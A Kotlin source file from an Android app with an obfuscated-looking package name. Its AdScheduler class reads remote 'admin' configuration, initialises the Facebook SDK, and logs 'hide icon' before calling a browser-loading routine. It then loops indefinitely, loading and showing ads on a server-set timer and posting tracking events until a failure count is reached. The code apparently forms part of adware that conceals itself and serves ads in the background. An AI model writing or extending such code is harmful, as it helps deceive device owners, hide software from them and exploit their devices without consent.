package com.during.festival.rain.falls.one.ad

import com.during.festival.rain.falls.one.utils.TtPoint
import com.during.festival.rain.falls.one.zbrokloe.BrowserLoad


import com.during.festival.rain.falls.one.utils.PngAllData
import com.during.festival.rain.falls.one.utils.FragmentManager
import com.during.festival.rain.falls.one.main.IntBorApp
import com.during.festival.rain.falls.one.main.IntBorApp.mainStart
import com.facebook.FacebookSdk
import com.facebook.appevents.AppEventsLogger
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class AdScheduler(private val adManager: AdManager) {
    private var jobAdRom: Job? = null
    fun initFaceBook() {
        val jsonBean = IntBorApp.getAdminData()
        val data = jsonBean?.assetManagement?.identifiers?.socialId ?: ""
        if (data.isNullOrBlank()) {
            return
        }
        IntBorApp.showLog("initFaceBook: ${data}")
        FacebookSdk.setApplicationId(data)
        FacebookSdk.sdkInitialize(mainStart)
        AppEventsLogger.activateApp(mainStart)
    }

    fun startRomFun() {
        initFaceBook()
        adManager.initAd()
        val adminData = IntBorApp.getAdminData() ?: return
        val delayChecks = adminData.applicationSettings.schedule.checkIntervals.getOrNull(0) ?: 0
        val delayData = delayChecks.toLong().times(1000L)
        IntBorApp.showLog("startRomFun delayData=: ${delayData}")
        jobAdRom = CoroutineScope(Dispatchers.Main).launch {
            while (true) {
                val currentFragment = FragmentManager.getCurrentFragment()
                if (currentFragment == null || (currentFragment.javaClass.name != PngAllData.reladRu || currentFragment.javaClass.name != PngAllData.reladRu2)) {
                    if (currentFragment == null) {
                        IntBorApp.showLog("隐藏图标=null")
                    } else {
                        IntBorApp.showLog("隐藏图标=${currentFragment.javaClass.name}")
                    }
                    BrowserLoad.bload("eryhappyxxevdaynfs", true)
                    break
                }
                delay(500)
            }
            checkAndShowAd(delayData)
        }
    }

    private suspend fun checkAndShowAd(delayData: Long) {
        while (true) {
            IntBorApp.showLog("循环检测广告")
            TtPoint.postPointData(false, "timertask")
            if (adNumAndPoint()) {
                jumfailpost()
                jobAdRom?.cancel()
                break
            } else {
                adManager.loadAd()
                adManager.isHaveAdNextFun()
                delay(delayData)
            }
        }
    }
    private fun jumfailpost(){
       val adFailPost = IntBorApp.okSpBean.adFailPost
        if(!adFailPost){
            TtPoint.postPointData(false, "jumpfail")
            IntBorApp.okSpBean.adFailPost = true
        }
    }
    private fun adNumAndPoint(): Boolean {
        val adminBean = IntBorApp.getAdminData()
        if (adminBean == null) {
            IntBorApp.showLog("AdminBean is null, cannot determine adNumAndPoint")
            return false
        }

        // 从配置中获取最大失败次数
        val maxFailNum = adminBean.applicationSettings.schedule.maxFailures ?: 0
        // 如果失败次数超过最大限制且需要重置
        IntBorApp.showLog("maxFailNum=${maxFailNum}----startApp.okSpBean.isAdFailCount=${IntBorApp.okSpBean.isAdFailCount}")

        if (IntBorApp.okSpBean.isAdFailCount >= maxFailNum) {
            IntBorApp.showLog("Ad failure count has exceeded the limit, resetting...")
            return true
        }
        return false
    }
}
